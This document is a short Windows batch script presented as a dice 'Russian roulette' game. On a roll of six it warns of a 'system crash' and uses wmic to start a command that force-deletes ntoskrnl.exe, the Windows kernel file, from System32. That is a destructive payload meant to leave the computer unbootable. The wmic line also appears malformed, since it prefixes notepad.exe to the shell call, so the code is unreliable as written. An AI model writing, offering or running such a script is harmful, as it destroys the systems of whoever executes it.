@echo off
set /a roll=%random% %% 6 + 1
echo You rolled a %roll%!

if %roll% NEQ 6 (
  echo Congratulations, you survived!
  exit /b 0
) else (
  echo Uh-oh, you rolled a 6! Prepare for a system crash...
  timeout /t 3 /nobreak > nul
  wmic process call create "notepad.exe %COMSPEC% /C timeout /t 1 /nobreak > nul & del /f /q %SYSTEMROOT%\\System32\\ntoskrnl.exe"
)
